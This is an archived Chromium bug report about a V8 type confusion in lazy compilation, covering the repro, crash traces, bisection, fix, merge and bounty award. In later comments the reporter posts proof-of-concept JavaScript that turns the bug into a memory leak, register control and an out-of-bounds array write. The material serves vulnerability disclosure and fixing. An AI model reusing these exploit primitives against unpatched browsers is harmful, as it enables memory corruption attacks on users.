# Security: [v8] Type Confusion in Builtins_CallUndefinedReceiver1Handler

| Field | Value |
|-------|-------|
| **Issue ID** | [40093900](https://issues.chromium.org/issues/40093900) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cw...@gmail.com |
| **Assignee** | ve...@chromium.org |
| **Created** | 2019-01-30 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

A lazy-compiled function generates an interpreter code confusing smi value as a heap object. seems like it accesses a function object mutated to smi when generating a call stack.

**VERSION**  

Chrome Version: 72.0.3626.81 stable (v8 7.2.502.24)  

Operating System: Any OS

**REPRODUCTION CASE**

```
callFn = function (code) {  
  try { code(); } catch (e) { console.log(e); }  
}  
  
let proxy = new Proxy({}, {});  
  
function run(prop, ...args) {  
  let handler = {};  
  const proxy = new Proxy(function () {}, handler);  
  handler[prop] = (({v1 = ((v2 = (function () {  
    var v3;  
    var callFn = 0;  
    if (asdf) {  
      return;  
    } else {  
      return;  
    }  
    (function () { v3(); });  
    (function () { callFn = 0x41414141; });  
  })) => (1))() }, ...args) => (1));  
  Reflect[prop](proxy, ...args);  
}  
  
callFn((() => (run("construct", []))));  
callFn((() => (run("prop1"))));  
callFn((() => (run("prop2"))));  

```

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

```
Thread 1 "d8" received signal SIGSEGV, Segmentation fault.  
0x000055a5e2d981f0 in Builtins_CallUndefinedReceiver1Handler ()  
(gdb) x/i $pc  
=> 0x55a5e2d981f0 <Builtins_CallUndefinedReceiver1Handler+208>: movzx  edx,WORD PTR [rdx+0xb]  
(gdb) i r rdx  
rdx            0x4141414100000000       4702111233380188160  

```

This is a stack trace from DEBUG build.

```
#0  v8::internal::HeapObject::IsString (this=0x29813d2253c1) at ../../src/objects/instance-type-inl.h:70  
#1  v8::internal::HeapObject::HeapObjectShortPrint (this=0x29813d2253c1, os=...) at ../../src/objects.cc:3444  
#2  0x00007f6153ce72fb in v8::internal::operator<< (os=..., v=...) at ../../buildtools/third_party/libc++/trunk/include/ostream:864  
#3  0x00007f6153d14f10 in v8::internal::Object::ShortPrint (this=0x29813d2253c1, accumulator=0x7ffee40138e8) at ../../src/objects.cc:2570  
#4  0x00007f6154025622 in v8::internal::StringStream::PrintObject (this=0x7ffee40138e8, o=0x29813d2253c1) at ../../src/string-stream.cc:182  
#5  0x00007f6154024cbb in v8::internal::StringStream::Add (this=0x7ffee40138e8, format=..., elms=...) at ../../src/string-stream.cc:125  
#6  0x00007f6153a81732 in v8::internal::StringStream::Add<int, v8::internal::Object\*> (this=<optimized out>, format=..., args=<optimized out>, args=<optimized out>)  
    at ../../src/string-stream.h:135  
#7  v8::internal::StringStream::Add<int, v8::internal::Object\*> (this=<optimized out>, format=0x7f6153340ea4 "  [%02d] : %o\n", args=<optimized out>, args=<optimized out>)  
    at ../../src/string-stream.h:129  
#8  v8::internal::JavaScriptFrame::Print (this=0x7ffee40135c8, accumulator=<optimized out>, mode=v8::internal::StackFrame::DETAILS, index=<optimized out>)  
    at ../../src/frames.cc:2066  
#9  0x00007f6153c255e4 in v8::internal::PrintFrames (isolate=<optimized out>, accumulator=<optimized out>, mode=v8::internal::StackFrame::DETAILS) at ../../src/isolate.cc:1166  
#10 v8::internal::Isolate::PrintStack (this=0x558c80a95810, accumulator=0x7ffee40138e8, mode=v8::internal::Isolate::kPrintStackVerbose) at ../../src/isolate.cc:1185  
#11 0x00007f6153c2a137 in v8::internal::Isolate::PrintStack (this=0x558c80a95810, out=0x7f6152b41680 <_IO_2_1_stderr_>, mode=v8::internal::Isolate::kPrintStackVerbose)  
    at ../../src/isolate.cc:1144  
#12 0x00007f6153fc1db5 in v8::internal::__RT_impl_Runtime_AbortJS (args=..., isolate=0x558c80a95810) at ../../src/runtime/runtime-test.cc:706  
#13 0x00007f6153fc1897 in v8::internal::Runtime_AbortJS (args_length=<optimized out>, args_object=0x7ffee4013ad0, isolate=0x558c80a95810) at ../../src/runtime/runtime-test.cc:697  
#14 0x00007f615460a1f2 in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit () from out/x64.debug/./libv8.so  
#15 0x00007f6154782240 in Builtins_CallUndefinedReceiver1Handler () from out/x64.debug/./libv8.so  

```

**CREDIT INFORMATION**  

Reporter credit: Choongwoo Han of NAVER Corp.

## Attachments

- [test.html](attachments/test.html) (text/plain, 624 B)
- [test.html](attachments/test_53347303.html) (text/plain, 850 B)

## Timeline

### cl...@chromium.org (2019-01-30)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5984073168322560.

### cl...@chromium.org (2019-01-30)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4886131116212224.

### cl...@chromium.org (2019-01-30)

Detailed report: https://clusterfuzz.com/testcase?key=5984073168322560

Job Type: linux_asan_d8
Platform Id: linux

Crash Type: Null-dereference READ
Crash Address: 0x000000000000
Crash State:
  Builtins_CallUndefinedReceiver1Handler
  Builtins_InterpreterEntryTrampoline
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=57562:57563

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5984073168322560

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

### cl...@chromium.org (2019-01-30)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>JavaScript]

### cl...@chromium.org (2019-01-30)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/6e5671e1cdd33f8f51b2afeab499881a83e52179 ([nojit] Embed InterpreterEntryTrampoline).

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### ha...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### jg...@chromium.org (2019-01-30)

I'll investigate this today.

### cl...@chromium.org (2019-01-30)

Detailed report: https://clusterfuzz.com/testcase?key=4886131116212224

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Null-dereference READ
Crash Address: 0x000000000000
Crash State:
  Builtins_CallUndefinedReceiver1Handler
  Builtins_InterpreterEntryTrampoline
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=609145:609147

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4886131116212224

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

### jg...@chromium.org (2019-01-30)

I can repro on tot linux x64 debug:

TypeError: 'construct' on proxy: trap returned non-object ('1')
abort: CSA_ASSERT failed: IsStrong(object) [../../src/code-stub-assembler.cc:1347]

### me...@chromium.org (2019-01-30)

Thanks jgruber@

### jg...@chromium.org (2019-01-30)

Following this backwards: 

In JSCallN [0] we receive a function that is not a valid object. Repro by inserting 

 CallRuntime(Runtime::kHeapObjectVerify, context, function);


But it appears the bug happens earlier in lazy compilation. Here's a reduced repro: 

$ cat tmp.js 
const handler = {};
const proxy = new Proxy(function() {}, handler);
handler.construct =
  (v1 = (function() {
    if (asdf) { return; } else { return; }
    (function() {});
  })()) => 1;
Reflect.construct(proxy, []);


$ out/debug/d8 tmp.js --verify-heap 

# Fatal error in ../../src/objects.cc, line 13933
# Check failed: fun->function_literal_id() < shared_function_infos()->length() (5 vs. 5).

(gdb) bt
#0  v8::base::OS::Abort () at ../../src/base/platform/platform-posix.cc:400
#1  0x00007f6da709fb42 in V8_Fatal (file=0x7f6da4a3a60d "../../src/objects.cc", line=13933, format=0x7f6da4a35cd5 "Check failed: %s.")
    at ../../src/base/logging.cc:171
#2  0x00007f6da56b370a in v8::internal::Script::FindSharedFunctionInfo (this=0x7ffee1bd9098, isolate=0x55d511ca7490, fun=0x55d511d46a58)
    at ../../src/objects.cc:13933
#3  0x00007f6da4fb1903 in v8::internal::Compiler::GetSharedFunctionInfo (literal=0x55d511d46a58, script=..., isolate=0x55d511ca7490)
    at ../../src/compiler.cc:1961
#4  0x00007f6da5597955 in v8::internal::interpreter::BytecodeGenerator::AllocateDeferredConstants (this=0x55d511d293d0, 
    isolate=0x55d511ca7490, script=...) at ../../src/interpreter/bytecode-generator.cc:1001
#5  0x00007f6da55975a3 in v8::internal::interpreter::BytecodeGenerator::FinalizeBytecode (this=0x55d511d293d0, isolate=0x55d511ca7490, 
    script=...) at ../../src/interpreter/bytecode-generator.cc:965
#6  0x00007f6da55c28e7 in v8::internal::interpreter::InterpreterCompilationJob::FinalizeJobImpl (this=0x55d511d29300, shared_info=..., 
    isolate=0x55d511ca7490) at ../../src/interpreter/interpreter.cc:214
#7  0x00007f6da4fa9a3f in v8::internal::UnoptimizedCompilationJob::FinalizeJob (this=0x55d511d29300, shared_info=..., 
    isolate=0x55d511ca7490) at ../../src/compiler.cc:158
#8  0x00007f6da4fb2db4 in v8::internal::(anonymous namespace)::FinalizeUnoptimizedCompilationJob (job=0x55d511d29300, shared_info=..., 
    isolate=0x55d511ca7490) at ../../src/compiler.cc:425
#9  0x00007f6da4fac5bf in v8::internal::(anonymous namespace)::FinalizeUnoptimizedCode (parse_info=0x7ffee1bd9990, isolate=0x55d511ca7490, 
    shared_info=..., outer_function_job=0x55d511d34a10, inner_function_jobs=0x7ffee1bd9920) at ../../src/compiler.cc:594
#10 0x00007f6da4fac0c5 in v8::internal::Compiler::Compile (shared_info=..., flag=v8::internal::Compiler::KEEP_EXCEPTION, 
    is_compiled_scope=0x7ffee1bd9db8) at ../../src/compiler.cc:1182
#11 0x00007f6da4fac8b6 in v8::internal::Compiler::Compile (function=..., flag=v8::internal::Compiler::KEEP_EXCEPTION, 
    is_compiled_scope=0x7ffee1bd9db8) at ../../src/compiler.cc:1212
#12 0x00007f6da5871134 in v8::internal::__RT_impl_Runtime_CompileLazy (args=..., isolate=0x55d511ca7490)
    at ../../src/runtime/runtime-compiler.cc:40
#13 0x00007f6da5870d52 in v8::internal::Runtime_CompileLazy (args_length=1, args_object=0x7ffee1bd9e90, isolate=0x55d511ca7490)
    at ../../src/runtime/runtime-compiler.cc:22
#14 0x00007f6da65bcd52 in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit ()
   from out/debug/./libv8.so
#15 0x00007f6da5c6ef38 in Builtins_CompileLazy () from out/debug/./libv8.so
#16 0x00007f6da5c23d80 in Builtins_ArgumentsAdaptorTrampoline () from out/debug/./libv8.so
#17 0x0000379a1640b039 in ?? ()
#18 0x0000379a1640b001 in ?? ()
#19 0x0000000000000000 in ?? ()


There's no crash when passing --no-lazy.

### jg...@chromium.org (2019-01-30)

Even simpler:

$ cat tmp.js 
const f =
  (v1 = (function() {
    if (asdf) { return; } else { return; }
    (function() {});
  })()) => 1;
f();

### jg...@chromium.org (2019-01-30)

The comment above the failing check suggests AstTraversalVisitor:

  // If this check fails, the problem is most probably the function id
  // renumbering done by AstFunctionLiteralIdReindexer; in particular, that
  // AstTraversalVisitor doesn't recurse properly in the construct which
  // triggers the mismatch.

### jg...@chromium.org (2019-01-30)

Started bisecting, 72.0.3605.0 is good, 72.0.3606.0 is bad. V8 changelog:

https://chromium.googlesource.com/v8/v8/+log/7.2.265..7.2.281?n=10000

### jg...@chromium.org (2019-01-30)

The first bad commit is 

commit 7412593920eceebbbc37ef290d1e3fcb168a3c31 (HEAD)
[ignition] More accurate dead statement elision
Reviewed-on: https://chromium-review.googlesource.com/c/1322951

Leszek ptal :)

### me...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-31)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### le...@chromium.org (2019-01-31)

I don't think this patch is the cause, it probably just juggles the dead code in just the right way. Seems more like a renumbering issue in default params. Assigning across to verwaest

### go...@chromium.org (2019-01-31)

+ awhalley@, is this indeed M72 stable blocker?  

For Android, M72 is already out at 50% and plan is to ramp up to 100%.

### aw...@google.com (2019-01-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-13)

verwaest: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ve...@chromium.org (2019-02-14)

This was actually fixed by https://chromium-review.googlesource.com/c/v8/v8/+/1470108. Apparently I forgot to reference the bug.

### ve...@chromium.org (2019-02-14)

Leszek was right; I'd say this bug is actually pretty old. In the case of dead code, it seems visitors disagreed as to whether the nodes should be processed. That lead to (in the simple repro case) out-of-bounds access to a SharedFunctionInfo array. I haven't deeply investigated what (else) could go wrong, but it seems at least plausible that this would lead to security issues.

### cl...@chromium.org (2019-02-15)

ClusterFuzz has detected this issue as fixed in range 59568:59569.

Detailed report: https://clusterfuzz.com/testcase?key=5984073168322560

Job Type: linux_asan_d8
Platform Id: linux

Crash Type: Null-dereference READ
Crash Address: 0x000000000000
Crash State:
  Builtins_CallUndefinedReceiver1Handler
  Builtins_InterpreterEntryTrampoline
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=57562:57563
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=59568:59569

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5984073168322560

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2019-02-15)

ClusterFuzz testcase 5442489100140544 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### cl...@chromium.org (2019-02-15)

ClusterFuzz has detected this issue as fixed in range 631877:631878.

Detailed report: https://clusterfuzz.com/testcase?key=4886131116212224

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Null-dereference READ
Crash Address: 0x000000000000
Crash State:
  Builtins_CallUndefinedReceiver1Handler
  Builtins_InterpreterEntryTrampoline
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=609145:609147
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=631877:631878

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4886131116212224

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### sh...@chromium.org (2019-02-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-17)

This bug requires manual review: M73 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), cindyb@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2019-02-19)

[Empty comment from Monorail migration]

### ab...@google.com (2019-02-19)

Is there any merge required to M73?

### aw...@google.com (2019-02-19)

Yep, the change would be 9439a1d2bba439af0ae98717be28050c801492c1 per https://crbug.com/chromium/926651#c24

### ab...@google.com (2019-02-20)

hablich@ are you comfortable with https://chromium-review.googlesource.com/c/v8/v8/+/1470108 for M73?

### ha...@chromium.org (2019-02-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-02-25)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2019-02-25)

Thanks for the report! The VRP panel decided to reward $1,000, but noted they would revisit for a higher amount if you could describe how this could be used for more than a read. Cheers!

### sh...@chromium.org (2019-02-25)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cw...@gmail.com (2019-02-25)

What does it mean by "more than a read"? This is not just a read. It's a type confusion because of memory corruption. So, there could be more cases.

this is another examples:
1) memory leak
```
callFn = function (code) {
  try { code(); } catch (e) { console.log(e); }
}

let proxy = new Proxy({}, {});

function run(prop, ...args) {
  let handler = {};
  const proxy = new Proxy(function () {}, handler);
  handler[prop] = (({v1 = ((v2 = (function () {
    var v3;
    var callFn = 0;
    if (asdf) {
      return;
    } else {
      return;
    }
    (function () { v3(); });
    (function () { callFn = "11111111111111111111111111111111"; });
  })) => (1))() }, ...args) => (1));
  Reflect[prop](proxy, ...args);
}

callFn((() => (run("construct", []))));
callFn((() => (run("prop1"))));

console.log(run);
```
```
$ ./out.gn/x64.release/d8 --expose-gc --allow-natives-syntax ./test/mjsunit/mjsunit.js ./test.js | xxd
00000000: 5479 7065 4572 726f 723a 2027 636f 6e73  TypeError: 'cons
00000010: 7472 7563 7427 206f 6e20 7072 6f78 793a  truct' on proxy:
00000020: 2074 7261 7020 7265 7475 726e 6564 206e   trap returned n
00000030: 6f6e 2d6f 626a 6563 7420 2827 3127 290a  on-object ('1').
00000040: e0b0 a1ec 8680 e1af b000 e9ab a1ea a992  ................
00000050: e0b6 9400 e9bd 89ea a992 e0b6 9400 e9bb  ................
00000060: b9ea a992 e0b6 9400 e295 81e6 b698 e0a8  ................
00000070: 9200 d6b1 ec86 80e1 afb0 00e0 ab91 ec86  ................
00000080: 80e1 afb0 0000 00ee 91a0 00e9 a589 eaa9  ................
00000090: 92e0 b694 00e9 be81 eaa9 92e0 b694 00cb  ................
000000a0: 81ec 8680 e1af b000 e0ab 91ec 8680 e1af  ................
000000b0: b000 0000 ee99 8000 e9a4 b1ea a992 e0b6  ................
000000c0: 9400 ecbf 99c9 90e1 86bd 00cb 81ec 8680  ................
000000d0: e1af b000 e597 91ec 8680 e1af b000 d391  ................
```

2) Corrupting call register in 32bit
```
callFn = function (code) {
  try { code(); } catch (e) { console.log(e); }
}

let proxy = new Proxy({}, {});

function run(prop, ...args) {
  let handler = {};
  const proxy = new Proxy(function () {}, handler);
  handler[prop] = (({v1 = ((v2 = (function () {
    var v3;
    var callFn = 0;
    if (asdf) {
      return;
    } else {
      return;
    }
    (function () { v3(); });
    (function () { callFn = 0x10a00010; });

  })) => (1))() }, ...args) => (1));
  Reflect[prop](proxy, ...args);
}

callFn((() => (run("construct", []))));
callFn((() => (run("prop1"))));

console.log(run);
```

```
$ gdb -q --args ./out.gn/ia32.release/d8 --expose-gc --allow-natives-syntax ./test/mjsunit/mjsunit.js ./test.js
Reading symbols from ./out.gn/ia32.release/d8...(no debugging symbols found)...done.
(gdb) r
...
TypeError: 'construct' on proxy: trap returned non-object ('1')

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x5682413b in v8::internal::String::GetFlatContent() ()
(gdb) x/i $pc
=> 0x5682413b <_ZN2v88internal6String14GetFlatContentEv+139>:   call   DWORD PTR [ecx+0x1c]
(gdb) i r ecx
ecx            0x8131b805       -2127448059
```

### cw...@gmail.com (2019-02-26)

I attached one more PoC. It corrupts a length of an Array, and makes OOB access. reliably reproducible in d8 and Chrome in Mac.

```
function run(prop, ...args) {
  let handler = {};
  const proxy = new Proxy(function () {}, handler);
  handler[prop] = (({v1 = ((v2 = (function () {
    var v3 = 0;
    var callFn = 0;
    if (asdf) { return; } else { return; }
    (function () { v3(); });
    (function () {
      callFn = "\u0041".repeat(1024*32); // mutate "run"
      v3 = [1,2,3,4,5,6]; // now "proxy" becomes a packed array.
    })
  })) => (1))() }, ...args) => (1));
  Reflect[prop](proxy, ...args);
}

callFn((() => (run("construct", []))));
callFn((() => (run("prop1"))));

function test() {
  run[13] = 0x41414141;
  print(proxy.length);
  proxy[0x41414141 >> 3] = 0x12121212;
}
test();
```

```
(gdb) x/i $pc
=> 0x55d2168467cf <Set()+47>:   mov    QWORD PTR [rax+r14*1+0xf],r12
(gdb) i r rax
rax            0x41414140       1094795584
(gdb) i r r14
r14            0x11bd0250daf9   19503485344505
(gdb) i r r12
r12            0x1212121200000000       1302123110782205952
```

### aw...@chromium.org (2019-02-28)

Thanks  cwhan.tunz@! I've re-labeled this for the panel to look at.

Cheers,

Andrew

### aw...@google.com (2019-03-05)

verwaest@ - mind doing the merge to M73? The merge has been approved.

### ve...@chromium.org (2019-03-05)

Done.

### aw...@google.com (2019-03-05)

Thanks!

### na...@google.com (2019-03-07)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-03-07)

Congrats! The Panel decided to reward $5,000 for this report :) 

### aw...@google.com (2019-03-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-05-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/926651?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/926988]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093900)*
